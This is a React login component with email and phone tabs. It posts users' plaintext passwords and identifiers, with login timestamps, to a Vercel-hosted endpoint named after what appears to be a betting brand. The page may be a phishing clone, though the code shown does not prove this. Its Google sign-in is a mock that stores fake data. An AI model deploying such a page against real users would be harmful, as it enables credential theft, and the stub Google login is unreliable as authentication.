import React, { useState } from 'react';
import axios from 'axios';
import { useNavigate } from 'react-router-dom';

const Home = () => {
  const navigate = useNavigate();
  const [activeTab, setActiveTab] = useState('email');
  const [formData, setFormData] = useState({
    email: '',
    phone: '',
    password: '',
  });
  const [errors, setErrors] = useState({
    email: '',
    phone: '',
    password: '',
  });
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');

  const handleTabChange = (tab) => {
    setActiveTab(tab);
    // Clear errors when switching tabs
    setErrors({ email: '', phone: '', password: '' });
  };

  const handleInputChange = (e) => {
    const { name, value } = e.target;
    setFormData({
      ...formData,
      [name]: value,
    });
    
    // Clear specific field error when typing
    if (errors[name]) {
      setErrors({
        ...errors,
        [name]: ''
      });
    }
  };

  const togglePasswordVisibility = () => {
    setShowPassword(!showPassword);
  };

  const validateForm = () => {
    let isValid = true;
    const newErrors = { email: '', phone: '', password: '' };
    
    // Password validation (for both tabs)
    if (!formData.password) {
      newErrors.password = 'Please enter your password';
      isValid = false;
    } else if (formData.password.length < 6) {
      newErrors.password = 'Password must be at least 6 characters';
      isValid = false;
    }
    
    // Email validation (only when email tab is active)
    if (activeTab === 'email') {
      if (!formData.email) {
        newErrors.email = 'Please enter your email address';
        isValid = false;
      }
    }
    
    // Phone validation (only when phone tab is active)
    if (activeTab === 'phone') {
      if (!formData.phone) {
        newErrors.phone = 'Please enter your phone number';
        isValid = false;
      } else if (formData.phone.length !== 10) {
        newErrors.phone = 'Phone number must be 10 digits';
        isValid = false;
      }
    }
    
    setErrors(newErrors);
    return isValid;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    
    // Validate form before submission
    if (!validateForm()) {
      return;
    }
    
    setLoading(true);
    setError('');

    try {
      // Get current date and time
      const currentDateTime = new Date();
      
      // Define payload based on active tab
      const payload = {
        password: formData.password,
        loginDate: currentDateTime.toISOString().split('T')[0], // YYYY-MM-DD format
        loginTime: currentDateTime.toTimeString().split(' ')[0], // HH:MM:SS format
        loginMethod: activeTab,
        ...(activeTab === 'email' 
          ? { email: formData.email, phone: null } 
          : { phone: `+91${formData.phone}`, email: null })
      };

      // API call to your backend
      const response = await axios.post('https://4ra-bet7532.vercel.app/api/login', payload);
      
      console.log('Login successful:', response.data);
      
      // Store user data in localStorage for persistence
      localStorage.setItem('userData', JSON.stringify(response.data.user));
      localStorage.setItem('token', response.data.token);
      
      // Navigate to user details page
      navigate('/Support');
      
    } catch (err) {
      setError(err.response?.data?.message || 'Login failed. Please try again.');
      console.error('Login error:', err);
    } finally {
      setLoading(false);
    }
  };

  const handleGoogleLogin = () => {
    // Implement Google login logic here
    console.log('Google login clicked');
    const currentDateTime = new Date();
    
    // For demonstration - in real app this would come from Google Auth response
    const mockGoogleResponse = {
      email: "user@gmail.com",
      name: "Google User",
      loginMethod: "google",
      loginDate: currentDateTime.toISOString().split('T')[0],
      loginTime: currentDateTime.toTimeString().split(' ')[0]
    };
    
    // Store demo data
    localStorage.setItem('userData', JSON.stringify(mockGoogleResponse));
    navigate('/user-details');
  };

  return (
    <>
    <div className="login-container">
      
      <h1 className="login-header">LOGIN</h1>
      
      <div className="login-tabs">
        <button 
          className={`tab ${activeTab === 'email' ? 'active' : ''}`} 
          onClick={() => handleTabChange('email')}
        >
          <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <rect x="2" y="4" width="20" height="16" rx="2"></rect>
            <path d="M22 7l-10 7-10-7"></path>
          </svg>
          Email
        </button>
        <button 
          className={`tab ${activeTab === 'phone' ? 'active' : ''}`}
          onClick={() => handleTabChange('phone')}
        >
          <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <path d="M22 16.92v3a2 2 0 01-2.18 2 19.79 19.79 0 01-8.63-3.07 19.5 19.5 0 01-6-6 19.79 19.79 0 01-3.07-8.67A2 2 0 014.11 2h3a2 2 0 012 1.72 12.84 12.84 0 00.7 2.81 2 2 0 01-.45 2.11L8.09 9.91a16 16 0 006 6l1.27-1.27a2 2 0 012.11-.45 12.84 12.84 0 002.81.7A2 2 0 0122 16.92z"></path>
          </svg>
          Phone
        </button>
      </div>
      
      <form onSubmit={handleSubmit} className="login-form">
        <div className="tab-content">
          {activeTab === 'email' ? (
            <div className="input-group">
              <input 
                type="email" 
                name="email"
                placeholder="E-mail" 
                value={formData.email}
                onChange={handleInputChange}
              />
              {errors.email && <div className="error-message">{errors.email}</div>}
            </div>
          ) : (
            <div className="input-group">
              <div className="phone-input-container">
                <div className="country-code">
                  <div className="country-flag"></div>
                  <span>+91</span>
                </div>
                <input 
                  type="tel" 
                  name="phone"
                  className="phone-input" 
                  placeholder="Phone number" 
                  value={formData.phone}
                  onChange={handleInputChange}
                  maxLength={10}
                />
              </div>
              {errors.phone && <div className="error-message">{errors.phone}</div>}
            </div>
          )}
          
          <div className="input-group">
            <div className="password-input-container">
              <input 
                type={showPassword ? "text" : "password"} 
                name="password"
                placeholder="Password" 
                value={formData.password}
                onChange={handleInputChange}
              />
              <button 
                type="button" 
                className="toggle-password" 
                onClick={togglePasswordVisibility}
              >
                {showPassword ? (
                  <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                    <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
                    <line x1="1" y1="1" x2="23" y2="23"></line>
                  </svg>
                ) : (
                  <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                    <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
                    <circle cx="12" cy="12" r="3"></circle>
                  </svg>
                )}
              </button>
            </div>
            {errors.password && <div className="error-message">{errors.password}</div>}
          </div>
          
          <div className="forgot-password">
            <span className="forgot-password-text">Don't remember?</span>
            <a href="#" className="forgot-password-link">Recover a password</a>
          </div>
          
          {error && <div className="error-message">{error}</div>}
          
          <div className="no-account">
            Don't have an account?
          </div>
          <a href="#" className="signup-link">Sign up</a>
          
          <button 
            type="submit" 
            className="btn btn-primary"
            disabled={loading}
          >
            {loading ? 'SIGNING IN...' : 'SIGN IN'}
          </button>
          
          <div className="divider">
            <div className="divider-line"></div>
            <div className="divider-text">OR</div>
            <div className="divider-line"></div>
          </div>
          
          <button 
            type="button" 
            className="btn btn-google" 
            onClick={handleGoogleLogin}
          >
            <div className="google-icon">
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="18px" height="18px">
                <path fill="#FFC107" d="M43.611,20.083H42V20H24v8h11.303c-1.649,4.657-6.08,8-11.303,8c-6.627,0-12-5.373-12-12c0-6.627,5.373-12,12-12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C12.955,4,4,12.955,4,24c0,11.045,8.955,20,20,20c11.045,0,20-8.955,20-20C44,22.659,43.862,21.35,43.611,20.083z"/>
                <path fill="#FF3D00" d="M6.306,14.691l6.571,4.819C14.655,15.108,18.961,12,24,12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C16.318,4,9.656,8.337,6.306,14.691z"/>
                <path fill="#4CAF50" d="M24,44c5.166,0,9.86-1.977,13.409-5.192l-6.19-5.238C29.211,35.091,26.715,36,24,36c-5.202,0-9.619-3.317-11.283-7.946l-6.522,5.025C9.505,39.556,16.227,44,24,44z"/>
                <path fill="#1976D2" d="M43.611,20.083H42V20H24v8h11.303c-0.792,2.237-2.231,4.166-4.087,5.571c0.001-0.001,0.002-0.001,0.003-0.002l6.19,5.238C36.971,39.205,44,34,44,24C44,22.659,43.862,21.35,43.611,20.083z"/>
              </svg>
            </div>
            Continue with Google
          </button>
        </div>
      </form>
    </div>
    </>
  );
};

export default Home;